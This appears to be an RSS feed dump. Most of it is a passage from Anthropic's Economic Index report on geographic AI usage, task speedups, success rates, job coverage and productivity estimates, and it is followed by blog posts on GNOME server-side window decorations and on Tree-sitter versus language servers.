insignificant when controlling for other primitives (see Figure 3.5). This means the relationship pattern at one level of observation (country) contradicts the relationship pattern at another level (US state). Cross-country, educated populations may attempt harder tasks and therefore see lower success rates. Within homogeneous contexts, education may not improve task success.How humans prompt is how Claude respondsWe find a very high correlation between human and AI education, i.e. the number of years of education required to understand a human prompt or the AI’s response (countries:  = 0.925,  < 0.001,  = 117; US states:  = 0.928,  < 0.001,  = 50). This highlights the importance of skills and suggests that how humans prompt the AI determines how effective it can be. This also highlights the importance of model design and training. While Claude is able to respond in a highly sophisticated manner, it tends to do so only when users input sophisticated prompts.How models are trained, fine-tuned and instructed affects how they respond to users. For example, one AI model could have a system prompt that instructs it to always use simple language that a middle school student could understand, whereas another AI model may only respond in complex language that would require a PhD education to understand. For Claude, we observe a more dynamic pattern where how the user prompts Claude relates to how Claude responds.Higher income and higher usage are related to more augmentationHigher per capita usage countries, which tend to be higher per capita income countries, show lower automation, and less decision-making autonomy delegated to Claude. That is, higher income countries use AI more as an assistant and collaborator rather than letting it work independently. This relationship is not significant at the US state level, perhaps because income variation and use case diversity are more limited within the United States than globally. This mirrors a finding from our 3rd Economic Index report where countries with higher Anthropic AI Usage Index tend to use Claude in a more collaborative manner (augmentation), rather than letting it operate independently (automation).The striking geographic variation in our data shows that Claude is used in different ways around the world. GDP predicts the Anthropic AI Usage Index at both the country and US state level, and human education—the sophistication of user prompts—correlates with adoption at both levels as well.Other relationships depend on context. At the country level, higher usage correlates with shorter tasks and less AI autonomy; within the US, these patterns do not hold. Task success and human education show opposite relationships globally versus within the US.The near-perfect correlation between human and AI education years underscores that how users prompt Claude shapes how it responds. Combined with the finding that higher-usage countries engage Claude more collaboratively, this suggests that the skills required to use AI well may themselves be unevenly distributed.By measuring the characteristics of conversations with Claude, we find important relationships with broader economic factors such as human capital. These relationships may help predict labor market outcomes and inform a smooth transition to an AI-enabled economy that will require different skillsets.For privacy reasons, our automated analysis system filters out any cells—e.g., countries, and (country, task) intersections—with fewer than 15 conversations and 5 unique user accounts. For bottom-up request clusters, we have an even higher privacy filter of at least 500 conversations and 250 unique accounts.Data in this section covers 1 million Claude.ai Free, Pro and Max conversations from November 13 to 20, 2025, randomly sampled from all conversations in that period. We then excluded content that was flagged as potential trust and safety violations. The unit of observation is a conversation with Claude on Claude.ai, not a user, so it is possible that multiple conversations from the same user are included, though our past work suggests that sampling conversations at random versus stratified by user does not yield substantively different results. Aggregate geographic statistics at the country and US state level were assessed and tabulated from the IP address of each conversation. For geolocation, we use ISO-3166 codes since our provider for IP geolocation uses this standard. International locations use ISO-3166-1 country codes, US state level data use ISO-3166-2 region codes, which include all 50 US states and Washington DC. We exclude conversations originating from VPN, anycast, or hosting services, as determined by our IP geolocation provider.The world map is based on Natural Earth’s world map with the ISO standard point of view for disputed territories, which means that the map may not contain some disputed territories. We note that in addition to the countries shown in gray (“Claude not available”), we do not operate in the Ukrainian regions Crimea, Donetsk, Kherson, Luhansk, and Zaporizhzhia. In accordance with international sanctions and our commitment to supporting Ukraine’s territorial integrity, our services are not available in areas under Russian occupation.“No data” applies to countries with partially missing data. Some territories (e.g., Western Sahara, French Guiana) have their own ISO-3611 code. Some of these have some usage, others have none. Since the Anthropic AI Usage Index is calculated per working-age capita based on working age population data from the World Bank, and population data is not readily available for all of these territories, we cannot calculate the AUI for these territories.We exclude the Seychelles from all geographic analyses because a large fraction of usage we saw during the sampling dates was abusive traffic.We exclude Wyoming from all US state analyses because a large fraction of usage we saw during the sampling dates was abusive traffic.Chapter 4: Tasks and productivityIn this chapter, we examine how time savings, success rates, and autonomy vary across task types, and what this entails for potential impacts on jobs and productivity.The patterns reveal that more complex tasks yield greater time savings, but that this trades off against reliability. In a simple task removal exercise inspired by Autor and Thompson (2025), Claude's tendency to cover higher-education tasks produces a net deskilling effect across most occupations, as the tasks AI handles are often the more skilled components of a job.Claude usage spans a meaningful fraction of tasks across a growing share of occupations. We incorporate success rates into a richer model of job coverage; some occupations with modest coverage see large effects because AI succeeds on their most time-intensive work. Adjusting productivity estimates for task reliability roughly halves the implied gains, from 1.8 to about 1.0 percentage points of annual labor productivity growth over the next decade. However, these estimates reflect current model capabilities, and all signs suggest that reliability over increasingly long-running tasks will improve.Tradeoffs in task accelerationOur estimates suggest that, in general, the more complex tasks in our data yield a greater time savings (or “speedup”) from AI. We derive this by having Claude estimate both how long a task would take a human working alone and the duration when human and AI work together, which we validated in previous work. Speedup is then the human-alone time divided by the human-with-AI time. So reducing a 1 hour task to 10 minutes would give a 6x speedup.The left panel of Figure 4.1 below gives the average speedup against our core measure of task complexity, the human years of schooling required to understand the inputs, all at the O*NET task level. It shows that in Claude.ai conversations, for example, prompts requiring 12 years of schooling (a high school education) enjoy a speedup of 9x, while those requiring 16 years of schooling (a college degree) attain a 12x speedup. This implies that productivity gains are more pronounced for use cases requiring higher human capital, consistent with evidence that white collar workers are far more likely to adopt AI (e.g., Bick et al 2025).Throughout the range of task complexity, the speedup is higher for API users. This could reflect the nature of the API data, which is restricted to single-turn interactions, and that API tasks have been specifically selected for automation.The results also capture a tradeoff, however. More complex tasks have a lower task success rate, as shown in the panel on the right. On Claude.ai, for example, tasks requiring less than a high school education (e.g., answering basic questions about products) attain a 70% success rate, but this drops to 66% for college-level conversations like developing analysis plans. Still, accounting for the difference in success rates—by either excluding low-success tasks or discounting speedups by success probability—does not eliminate the education gradient: complex tasks still show greater net productivity gains.One way to examine the implications of the education gradient is to look at the share of automation across the education levels required to understand the inputs. If high-education tasks show relatively more automation, it could signal more exposure for white collar workers. Here, though, the message is unclear: the automation share is essentially unrelated to the human levels of education required to write the prompt (Appendix Figure A.1). On both Claude.ai and 1P API, tasks across education levels show automation patterns in roughly equal shares.In what contexts do users defer more to Claude? Claude.ai users give the AI slightly more autonomy when working on more complex tasks. In contrast, API usage shows uniformly lower autonomy at all levels of complexity.Note though that these distributions do not span the same set of tasks. API usage covers a more narrow swath of tasks in the economy, as seen in the concentration plot in Chapter 1. The high education tasks that experience heavy usage in the API data include security analysis, testing and quality assurance, and code review, whereas Claude.ai users are more likely to have iterative, instructive sessions.Task Horizons in Real-World UsageRecent work on AI “task horizons” (Kwa et al., 2025) finds that AI success rates decline with task duration: longer tasks are harder for models to complete. With each successive model generation, however, this decline has become shallower as models succeed on increasingly long tasks. METR operationalizes task horizon primarily as the maximum duration at which a model achieves at least 50% success, and growth in this metric has become a key indicator of AI progress.Figure 4.3 shows a similar measure using our primitives. The plot shows task-level success rates against the human time required, all at the O*NET task level. In the API data, success rates drop from around 60% for sub-hour tasks to roughly 45% for tasks estimated to take humans 5+ hours. The fitted line crosses the horizontal 50% success line at 3.5 hours, suggesting that API calls attain a 50% success rate for tasks that are 3.5 hours. The analogous time estimate in METR’s software engineering benchmark is 2 hours for Sonnet 4.5 and about 5 hours for Opus 4.5. (The data in this report predates the release of Opus 4.5.)Claude.ai data tells a different story. Success rates decline far slower as a function of task length. Extrapolating using the linear fit, Claude.ai would hit a 50% success rate at about 19 hours. This may reflect how multi-turn conversation effectively breaks complex tasks into smaller steps, with each turn providing a feedback loop that allows users to correct course.It’s worth noting that a fundamental difference from the METR setting is selection. METR constructs a benchmark where a fixed set of tasks is assigned to models. In our data, users choose which tasks to bring to Claude. This means observed success rates reflect not just model capability but also user judgment about what will work, the cost of setting up the problem for Claude, and the expected time savings if the task succeeds.If users avoid tasks they expect to fail, for example, observed success rates will overstate true capability on the full distribution of potential tasks. This selection likely operates on both platforms, but in different ways: API customers select for tasks amenable to automation, while Claude.ai users select for tasks that could benefit from iteration. Also due to this selection effect, there’s no guarantee that more performant models would show improvement in this plot, because users may respond to new models by providing more challenging presentations of otherwise similar O*NET tasks.Controlled benchmarks like METR’s measure the frontier of autonomous capability. Our real-world data can measure the  task horizon, reflecting a mix of model capabilities and user behavior, and expanding beyond coding tasks. Both approaches find that AI can be effective for tasks requiring hours of human work.Revisiting occupation penetration with effective AI coverageOur earlier work found that 36% of jobs had AI usage for at least a quarter of their tasks, with about 4% reaching 75% task coverage. This measure was based only on the appearance of a task in our data, however. The primitives introduced in this report can help better characterize how AI is changing the work content of occupations.First, we find that task coverage is increasing. Combining across reports, 49% of jobs have seen AI usage for at least a quarter of their tasks. But incorporating that task’s share of the job, and Claude’s average success rate, suggests a different set of affected occupations.We define effective AI coverage as the percent of a worker’s day that can be performed successfully by Claude. It’s calculated as the weighted sum of task success rates, where each task's weight is its share of the worker's time adjusted by how frequently the task occurs. The success rate comes from our primitives, the hours estimate from our previous work on productivity effects, and the frequency estimate from O*NET data, where surveyed workers indicate how often they perform the task.The plot below shows how the effective AI coverage (y-axis) differs from task coverage alone (x-axis). The two are highly correlated, but with key differences. On the right side of the plot, occupations with high coverage—where almost all tasks appear with some frequency in Claude data—generally fall below the 45-degree line. This suggests that even 90% task coverage does not necessarily indicate large job impacts, since Claude may fail on key covered tasks or miss the most time-intensive ones.Zooming in, several occupations show large differences in effective AI coverage compared to task coverage. For example, data entry workers have one of the highest effective AI coverage. This is because although only two of their nine tasks are covered, their largest task—reading and entering data from source documents—has high success rates with Claude. AI excels at what they spend most of their time doing.Medical transcriptionists and radiologists also move up because their covered tasks happen to be their most time-intensive and highest-frequency work. For radiologists, their top two tasks— interpreting diagnostic images and preparing interpretive reports—have high success rates. These occupations have low task coverage because AI can't do the hands-on or administrative work in their job profiles, but it succeeds on the core knowledge work that dominates their workday.Microbiologists fall below the 45-degree line, suggesting lower effective AI coverage than would be predicted by task coverage alone. Claude covers half of their tasks, but not their most time-intensive: hands-on research using specialized lab equipment.This measure arguably gives a more realistic picture of job-level AI penetration. However, its implications depend on how often these Claude conversations actually displace or augment work that would otherwise be done by humans. For data entry clerks, AI likely does substitute for tasks previously performed manually. But when a Claude conversation maps to a teacher performing a lecture, it is less clear how this translates to reduced lecture time on the job. In future work, we could leverage our 1P API data to understand which of these tasks are being integrated into production workflows.AI’s impact on the task content of jobsBeyond how much of a worker's day AI can successfully perform, a separate question is which tasks get covered, and whether those tend to be the high-skill or low-skill components of the job. Recent research has studied changes in the task mix within jobs to understand AI's impact on wages and employment (Autor and Thompson 2025; Hampole et al 2025). A key insight is that automation's effects depend not just on how many tasks are covered, but on which tasks.To see how jobs change when we remove the tasks AI can perform, we first construct a measure of the level of skill required for each task. O*NET doesn't provide task-level education requirements, so we train a model that predicts years of schooling from task embeddings, using the BLS's occupation-level education as the target. This way, a low-education occupation may still have a high-skill task if it looks like those that tend to exist in high-education occupations. For example, Legal Secretaries is a 12-year education occupation, but the task “Review legal publications and perform database searches to identify laws and court decisions relevant to pending cases” is predicted to require 17.7 years because it resembles tasks typically performed by lawyers and paralegals.The data shows that Claude tends to cover tasks that require higher levels of education. The mean predicted education for tasks in the economy is 13.2 years. For tasks that we see in our data, the mean prediction is about a year higher, 14.4 years (corresponding to an Associate’s degree). This aligns with the occupation-level results from earlier reports, showing more Claude usage among white collar occupations.We next calculate how removing AI-covered tasks shifts the average education level of what remains. Overall, the net first-order impact is to deskill jobs, since AI removes tasks that require relatively higher levels of education. One job that experiences such deskilling is technical writers, which loses tasks like "Analyze developments in specific field to determine need for revisions" (18.7 years) and "Review published materials and recommend revisions or changes in scope, format" (16.4 years), leaving tasks like "Draw sketches to illustrate specified materials" (13.6 years) and "Observe production, developmental, and experimental activities" (13.5 years). Travel agents also experience deskilling because AI covers tasks like "Plan, describe, arrange, and sell itinerary tour packages" (13.5 years) and "Compute cost of travel and accommodations" (13.4 years), while tasks like "Print or request transportation carrier tickets" (12.0 years) and "Collect payment for transportation and accommodations" (11.5 years) remain. Several teaching professions experience deskilling because AI addresses tasks like grading, advising students, writing grants, and conducting research without being able to do the hands-on work of delivering lectures in person and managing a classroom.Some jobs see average education levels increase. Real estate managers experience upskilling because AI covers routine administrative tasks—maintaining sales records (12.8 years), reviewing rents against market rates (12.6 years)—while tasks requiring higher-level professional judgment and in-person interaction remain, like securing loans, negotiating with architecture firms, and meeting with boards.These patterns illustrate how jobs may evolve over the coming years as their task content adjusts in response to AI. If the education level can be interpreted like expertise in Autor and Thompson's analysis, their framework might predict that wages will fall and employment will increase for technical writers and travel agents; conversely, real estate managers will specialize in complex negotiations and stakeholder management, shrinking employment while increasing wages.However, our education-based measure differs from Autor and Thompson's expertise concept: their framework would label some tasks as high expertise where ours specifies low education—for example, the Electrician task "Connect wires to circuit breakers, transformers, or other components." And these predictions are based on current Claude usage patterns, which will shift as models are trained on new capabilities and users discover new applications—potentially changing which tasks are covered and whether the net effect is deskilling or upskilling.Revisiting the aggregate productivity implications of Claude usageIn earlier work, we estimated that widespread adoption of AI could increase US labor productivity growth by 1.8 percentage points annually over the next decade. Here we revisit that analysis, incorporating the task success primitive introduced in this report and a richer treatment of task complementarity.Based on the speedups associated with tasks with at least 200 observations in our sample of 1M Claude.ai conversations, we replicate our previous finding that current-generation AI models and current usage patterns imply a productivity effect of 1.8 percentage points per year over the next decade.With the inclusion of 1P API data, we can assess whether implied labor productivity effects differ based on enterprise Claude deployment patterns. Two countervailing forces are at play: API usage is more concentrated in a narrower set of tasks and occupations (particularly coding-related work), which would tend to reduce implied effects; but task-level speedups are higher on average among API tasks, as implied by Figure 4.1. These forces largely offset: the API sample likewise implies a 1.8 percentage point increase in labor productivity over the next decade.A salient critique of this analysis is that it fails to account for model reliability. If workers must validate AI output, the productivity benefits will be smaller than raw speedups suggest. To assess how quantitatively important this channel might be, we incorporate the task success primitive introduced in this report, multiplying task-level time savings by task-specific success rates before aggregating.This adjustment has a meaningful effect: implied productivity growth falls from 1.8 to 1.2 percentage points per year for the next decade based on Claude.ai usage, and to 1.0 percentage points for API traffic. Yet, even after accounting for reliability, the implied impact remains economically significant—a sustained increase of 1.0 percentage point per year for the next ten years would return US productivity growth to rates that prevailed in the late 1990s and early 2000s.A second critique concerns task complementarity. If some tasks are essential and cannot easily be substituted, then overall productivity effects will be constrained regardless of speedups on other tasks. Teachers may prepare lesson plans more efficiently with AI while having no impact on time spent with students in the classroom.To operationalize this idea, we impose some structure on how we aggregate task-level time savings within occupations but otherwise add up occupational efficiency gains as in the main analysis. Specifically, we suppose that within each occupation tasks are combined according to a Constant Elasticity of Substitution (CES) aggregator, where each task is weighted by the estimated time spent on each task as calculated in our earlier analysis of the productivity effects implied by Claude usage.The key parameter is the elasticity of substitution across tasks, σ. When the elasticity of substitution is less than one, tasks are complements and those tasks that are not sped up by AI become bottlenecks for broader productivity gains. Alternatively, when the elasticity of substitution is greater than one, then workers can allocate toward the more productive tasks—thereby amplifying the overall time savings at the occupational level. An elasticity of substitution equal to one is a special case that replicates the main analysis above.Figure 4.6 reports the results of this exercise for different values of task substitutability. As expected, when the elasticity of substitution is equal to one the implied productivity effect is the same as in our baseline analysis: An increase in labor productivity growth of ~1.8 percentage points per year over the next decade implied by both Claude.ai and API samples.When tasks are complements, however, the implied aggregate labor productivity impact declines sharply as the economic effects are bottlenecked by tasks that AI speeds up the least. For example, at =0.5 the implied overall labor productivity effect is 0.7-0.9 percentage points per year—around half the size as implied by our baseline estimates. Additionally adjusting for task success further reduces the implied productivity effects to 0.8pp for Claude.ai and 0.6pp for API.On the other hand, when the elasticity of substitution is greater than one, the implied labor productivity based on pre-Opus 4.5 usage patterns is materially higher. For example, at =1.5 the implied labor productivity effect rises to 2.2-2.6 percentage points per year, consistent with greater specialization in tasks where AI provides the largest speedups.In both cases the implied productivity impact based on API traffic is more responsive to the degree of task substitutability. This is consistent with the fact that there is a larger share of API traffic concentrated in fewer tasks and associated occupations as compared to Claude.ai: When tasks are complements, this concentration amplifies the bottleneck problem; when they are substitutes, it amplifies productivity gains from task specialization.What this analysis shows is that the productivity effects of automation may ultimately be constrained by bottleneck tasks that elude AI automation for the time being. And the labor market implications of increasingly capable AI could be similarly affected by such forces. For example, Gans and Goldfarb (2026) argue that the presence of bottleneck tasks within jobs means that partial AI automation can lead to an increase in labor income as such tasks increase in economic value (at least until a job is  automated).The upshot of this chapter is that the impact of AI on the economy is unlikely to be uniform. As our effective AI coverage framework illustrates, the labor market implications for different workers will hinge on how reliable frontier AI tools are for their most central tasks.But the labor market effects may also depend on the skill requirements of tasks that AI can proficiently handle relative to the rest of the economy. Indeed, we find that removing tasks Claude can already handle from the economy would produce a net deskilling effect: the tasks remaining for humans have lower educational requirements than those handled by AI.While highly suggestive, this may miss an important detail: the most complex tasks where Claude is used tend also to be those where it struggles most. Rather than displacing highly skilled professionals, this could instead reinforce the value of their complementary expertise in understanding AI's work and assessing its quality.The counterpart to these transformative labor market effects is the broader impact on growth and productivity. On the one hand, incorporating task reliability into our analysis diminishes the implied effect on labor productivity growth as informed by current Claude usage patterns. If bottleneck tasks bind, the implied impact diminishes further. On the other hand, the continuing growth in model capabilities suggests that both task coverage and task success may increase, which, in turn, could increase productivity impacts. When we study the correlation between primitives with the O*NET, we restrict to tasks appearing in at least 100 conversations to reduce measurement error. In the coverage analysis, we use all tasks above the privacy threshold of 15.We generate embeddings for each task statement using a pretrained sentence transformer (all-mpnet-base-v2) and predict education with Ridge regression.On the other hand, some historical evidence suggests that when technologies automating job tasks appear in patent data, employment and wages subsequently fall for exposed occupations (Webb 2020). When we first assessed the aggregate productivity implications of Claude usage, we relied on a sample of 100k Claude.ai conversations from Fall 2025. Based on the set of tasks for which we observed speedups, we estimated that labor productivity could be 1.8 percentage points higher per year over the next decade. Expanding the sample to 1M observations means that we need to take a stand on how to handle very infrequently occurring tasks—which are very common given that usage follows a power law, as we documented in our past report. We choose a threshold of 0.02% because it replicates our previous results for our sample of Claude.ai conversations. For privacy-preserving reasons, we only ever analyze tasks with at least 15 observations, or an implied threshold of 0.015% for a 100k sample. And so our results are internally consistent across samples. If we do not impose a restriction on our 1M sample and assume that efficiency gains for any task in our sample, even those with just 15 observations out of one million, the implied aggregate labor productivity growth over the next decade would be roughly 5% percentage points per year—a mechanical increase based on a the much larger set of tasks included.As before, this result is based on applying Hulten’s Theorem to task-level productivity shocks and assuming that the corresponding one-time increase in total factor productivity materializes over the course of a decade alongside capital deepening effects.As a reminder, for aggregating to implied labor productivity we calculate task-level efficiency gains as the log difference between human time without AI and with AI. There are certainly other ways to adjust based on task reliability. If tasks in our sample are composed of sub-tasks with heterogeneous AI applicability, and workers optimally deploy AI only on sub-tasks where it is effective, then scaling the efficiency gain by the success rate captures the extensive margin of AI adoption within a task. We use a CES (constant elasticity of substitution) production function to aggregate task-level time savings to economy-wide productivity impacts. The elasticity parameter σ governs how easily workers can substitute between tasks. When σ=1, we apply Hulten's theorem directly: the aggregate productivity gain equals the wage-share-weighted sum of log speedups across tasks. For σ≠1, we use a two-level aggregation: first, within each occupation, we compute an occupation-level speedup as a CES aggregate of task speedups weighted by time fractions, using ρ=(σ-1)/σ. Then we apply Hulten's theorem to these occupation-level speedups. When σ<1 (complements), productivity gains are bottlenecked by tasks with the smallest speedups. When σ>1 (substitutes), workers can specialize in tasks where AI provides the largest speedups, amplifying aggregate gains. For tasks without observed AI speedup data, we assume no productivity change. We thank Pascual Restrepo for suggesting this particular exercise.This fourth Anthropic Economic Index Report introduces economic primitives—foundational characteristics of AI use—that show how Claude is used by both consumers and firms. We use Claude to estimate the extent to which usage varies along these dimensions; these measures are directionally accurate and, taken together, provide important signals even if individual classifications are imperfect.Our findings carry significant implications for how AI will reshape economies and labor markets. Notably, Claude tends to be used more, and appears to provide greater productivity boosts, on tasks that require higher education. If these tasks shrink for US workers, the net effect could be to deskill jobs. But these impacts depend crucially on complementarity across tasks, and whether increased productivity at a certain task may increase the demand for it.At the global level, the strong relationship between per capita income and usage patterns—with higher-income nations using Claude collaboratively while lower-income countries focus on coursework and specific applications—suggests that AI's impact will be mediated by existing institutional structures rather than unfolding uniformly. Geographic diffusion patterns reinforce this picture. Within the US, per capita usage has converged slightly; globally, diffusion is slower. Combined with income-driven differences in how AI is used, this raises questions about whether AI will narrow or widen international economic gaps.Equally important to the patterns documented here are potential changes across this and subsequent reports. As AI capabilities advance, Claude's success rate may increase, usage patterns may show greater autonomy, users may tackle new and more complex tasks, and tasks that prove automatable may graduate from interactive chat to API deployment. We will track these dynamics over time, providing a longitudinal view of AI's role in the economy.Building on prior releases, this edition significantly expands both the scope and transparency of usage data we share, including task-level classifications along new dimensions and regional breakdowns globally for the first time. We publish this data to enable researchers, journalists, and the public to investigate novel questions about AI's economic impacts that can form the empirical foundation for policy responses.How willing users are to experiment with AI, and whether policymakers create a regulatory context that advances both safety and innovation, will shape how AI transforms economies. For AI to benefit users globally, expanding access alone will not suffice—developing the human capital that enables effective use, particularly in lower-income economies, is essential.Authors & AcknowledgementsRuth Appel, Maxim Massenkoff, Peter McCrory*Lead authors of the reportMiles McCain, Ryan Heller, Tyler Neylon, Alex TamkinXabi Azagirre, Tim Belonax, Keir Bradwell, Andy Braden, Dexter Callender III, Sylvie Carr, Miriam Chaum, Ronan Davy, Evan Frondorf, Deep Ganguli, Kunal Handa, Andrew Ho, Rebecca Jacobs, Owen Kaye-Kauderer, Bianca Lindner, Kelly Loftus, James Ma, Jennifer Martinez, Jared Mueller, Kelsey Nanan, Kim O'Rourke, Dianne Penn, Sarah Pollack, Ankur Rathi, Zoe Richards, Alexandra Sanderford, David Saunders, Michael Sellitto, Thariq Shihipar, Michael Stern, Kim Withee, Mengyi Xu, Tony Zeng, Xiuruo Zhang, Shuyi Zheng, Emily Pastewka, Angeli Jain, Sarah Heck, Jared Kaplan, Jack Clark, Dario Amodei]]></content:encoded></item><item><title>Are AI agents ready for the workplace?

A basic understanding of linux and it’s desktop environments is assumed.Server side decorations (SSD) is the term for when when the application’s titlebar is drawn by the system and client side decorations (CSD) is the term for when the applications draws it’s own titlebar. KDE prefers the former, while GNOME prefers the latter. KDE and most other desktop environments supports both, while GNOME only supports CSD.Since SSD are drawn by the desktop, instead of by the application, apps that use it have a seperate titlebar (bottom), while apps that are designed around CSD tend to have an integrated titlebar (top).seperate titlebar (bottom) vs integrated titlebar (top)Image credit: Tobias BernardI will refer to the mutter compositor as GNOME, compositors in general as “the system” and gtk4/libadwaita apps as GNOME apps, for simplicity’s sake.Without further ado, let’s get to the titular question.Why  GNOME support SSD?#Many apps handle CSD poorly.#Certain applications work poorly without SSD. These apps end up having either no titlebar or a weird one, and the user can’t move or resize them easily. Davinci Resolve is one notable example, but it’s not the only one.GNOME is a large enough part of the linux desktop that most applications designed for SSD decorations implement a workaround in order to not be broken on GNOME. Usually, that workaround is libdecor.This sounds fine enough, except libdecor is the  of both worlds because you get the space inefficiency and lack of integration of a traditional titlebar, with all the inconsistency and lack of user customization of an integrated titlebar.Three applications with visually distinct libdecor-provided titlebarsThis is not the fault of the libdecor devs, it’s just because it’s a bandaid fix for a wider issue.Supporting SSD would solve this, as every application that does not wish to use CSD would have a nice native titlebar with consistent shading, colors, and corner radius, and developers would have to deal with less work and frustration.Supporting SSD would make apps “Feel more native”#On windows and macOS, any application can implement CSD in their application and have it respect the spacing, position and look of the titlebar buttons that the SSD equivalents that those platforms provide.The issue with doing that on linux is that the design of the titlebar can vary so wildy depending on the environment that having CSD’s that “feel native” is a bit of a losing battle. Offering the option of SSD for non-GNOME apps on GNOME and vice versa would go a long way to making applications feel more native for users that value that sort of thing.Many users of other desktops want their SSD respected.#A lot of users on other desktops are frustrated by GNOME apps not supporting SSD, breaking if SSD is force-enabled.While an app breaking when users do something unsupported is obviously not the developer’s fault, GNOME apps optionally supporting SSD would make many users of other desktops very happy indeed.If you’re wondering why a user would want SSD applied to a GNOME app, some people value titlebar consistency over the design of any individual app. Some users view SSD as an accessibility feature as well.GNOME’s lack of support hurts the linux desktop.#Linux is already a small market, and GNOME not supporting the de facto standard that is  only hurts the linux desktop by increasing fragmentation.This fragmentation only makes the linux desktop less attractive to developers and, importantly, makes application developers less likely to adopt more modern standards such as wayland.The arguments against SSD support#Many discussions about why GNOME should implement SSD stop at the arguments for it, but obviously there are also arguments against supporting SSD, otherwise GNOME would have implemented them by now.This is the main argument the GNOME developers use to justify why they don’t support SSD. This is true,  is an “unstable” protocol, and wayland was originally designed with only CSD in mind. However, wayland was also initally designed without screenshare or global keybinds, standards that GNOME had since adopted.The standard doesn’t pose the same kind of security or design issues that standards like the system tray one do, either.The fact is that it’s adopted by every production-ready desktop compositor other than GNOME’s mutter, and is relied upon by application and desktop developers alike, making it a de facto standard that is widely adopted.That is to say, while  is technically out of spec, the only thing distinguishing it from any wayland protocol that is “in spec” is GNOME’s lack of support for it.“Window decorations are part of the app, and thus shouldn’t be the purview of desktop.”#Many developers and users see the titlebar as something that is a part of the desktop, while some others disagree. This isn’t a problem, just a difference in philosophy.The real problem is the idea that GNOME project shouldn’t cater to the first group. It would be like GNOME not supporting  and saying that each app  ship their own file picker. But GNOME does support it, and only apps that wish to implement their own file picker do so.Since both approaches are used, and liked, miscellaneous advantages and disadvantages of either approach are irrelevant, and so are other arguments pertaining to design. This is why I haven’t brought them up.Hopefully I have made my point as to why it would be worthwhile for GNOME to adopt server side decorations, but a question still remains.What would it look like?#I have touched on what an implementation of SSD would look like a few times throughout this article without actually fully explaining what it would look like. So.Obviously GNOME would implement the relevant protocols and enable server side decorations on all application that don’t explicitely request SSD. This is in order to have SSD applied to apps that in only provide CSD as a fallback for compositors that don’t support SSD.To be clear, this  apply to apps that are designed for a united headerbar, like GNOME apps.On other desktops, however, GNOME apps would still request to not have SSD applied, a preference that is respected by every mainstream desktop. The only difference is that they would allow users the option to force a titlebar on GNOME apps. In this scenario, the GNOME app would remove the integrated window title and controls.This would be the best of both worlds, since GNOME users would enjoy more consistent titlebars and window shadows on third party apps and  on other desktops would gain the ability to have SSD on GNOME apps if they so wish.GNOME’s lack of support for server side decorations is the single biggest issue with the GNOME desktop environment right now, in my opinion, so I sincerely hope this article can serve as a push to get it implemented.If you want to help me with this, you can .]]></content:encoded></item><item><title>Help KDE Keep EU funding</title><link>https://www.reddit.com/r/linux/comments/1qk6icf/help_kde_keep_eu_funding/</link><author>/u/lajka30</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 20:55:48 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Tree-sitter vs. LSP</title><link>https://lambdaland.org/posts/2026-01-21_tree-sitter_vs_lsp/</link><author>/u/brightlystar</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 20:54:20 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[I got asked a good question today: what is the difference between Tree-sitter and a language server? I don’t understand how either of these tools work in depth, so I’m just going to explain from an ,  point of view.Tree-sitter is a . What this means is that you can hand Tree-sitter a description for a programming language and it will create a program that will parse that language for you. What’s special about Tree-sitter is that it is a.) fast, and b.) can tolerate  in the input. These two properties make Tree-sitter ideal for creating syntax highlighting engines in text editors. When you’re editing a program,  the program will be in a syntactically invalid state. During that time, you don’t want your colors changing or just outright breaking while you’re typing. Naïve regex-based syntax highlighters frequently suffer from this issue.Tree-sitter also provides a query language where you can make queries against the parse tree. I use this in the Emacs package I’m trying to develop to add Typst support to the Citar citation/bibliography tool: I can ask Tree-sitter to find a particular syntax object; it is safer and more robust than using a regular expression because it can do similar parsing to the Typst engine itself.In short, Tree-sitter provides syntax highlighting that is faithful to how the language implementation parses the program, instead of relying on regular expressions that incidentally come close.A  is a program that can analyze a program and report interesting information about that program to a text editor. A standard, called the Language Server Protocol (LSP), defines the kinds of JSON messages that pass between a text editor and the server. The protocol is an open standard; any language and any text editor can take advantage of the protocol to get nice smart programming helps in their system. Language servers can provide information like locating the definition of a symbol, possible completions at the cursor point, etc. to a text editor which can then decide how and when to display or use this information.Language servers solve the “

 problem” where 
 programming languages and 
 text editors would mean there have to be 
 implementations for language analyzers. Now, every language just needs a language server, and every editor needs to be able to speak the LSP protocol.Language servers are powerful because they can hook into the language’s runtime and compiler toolchain to get  answers to user queries. For example, suppose you have two versions of a  function, one imported from a  library, and another from a  library. If you use a tool like the dumb-jump package in Emacs
and you use it to jump to the definition for a call to , it might get confused as to where to go because it’s not sure what module is in scope at the point. A language server, on the other hand, should have access to this information and would not get confused.
  Using a language server for highlighting
  #It  possible to use the language server for syntax highlighting. I am not aware of any particularly strong reasons why one would want to (or  want to) do this. The language server can be a more complicated program and so could surface particularly detailed information about the syntax; it might also be slower than tree-sitter.Emacs’ built-in LSP client, Eglot, recently added eglot-semantic-tokens-mode to support syntax highlighting as provided from the language server. I have tried this a little bit in Rust code and it seems fine; the Tree-sitter-based syntax highlighting has been working just fine for me, so I will probably stick to that unless I find a compelling reason to use the LSP-based highlighting. Thanks to a comment on HN, I now know of a good reason why you would want to use a language server for syntax highlighting: the Rust language server rust-analyzer can tell your text editor when a variable reference is mutable or not, which means you could highlight  references differently than non- ones. Thanks to David Barsky for the tip!I wrote all of the above article. I did not ask an LLM to generate any portion of it. Please know that whenever you read something on my blog, it comes 100% from a human—me, Ashton Wiersdorf.I am not so anti-AI to say that LLMs are worthless or should never be used. I’ve used LLMs a little bit. I think they’re fantastic at translating between languages; this seems to be something that they should be good at doing. They’re helpful at writing some boring parts of the code I write. However, most of the time I find that I can typically write the tricky bits of the code about as fast as I could specify to an LLM what I want.I know that an LLM could have generated a facile pile of text much like the above, and honestly it would probably be decently helpful. However, know that what you have just read came directly from the fingers of a person who thought about the topic and bent his effort to helping you understand. This is from  human who understands the meaning behind each word here. I do not play games with syntax and generate answer-shaped blog posts. There is real meaning here. Enjoy it, and go forth and make more of it.]]></content:encoded></item><item><title>Section 230 Didn’t Fail Rand Paul. He Just Doesn’t Like the Remedy That 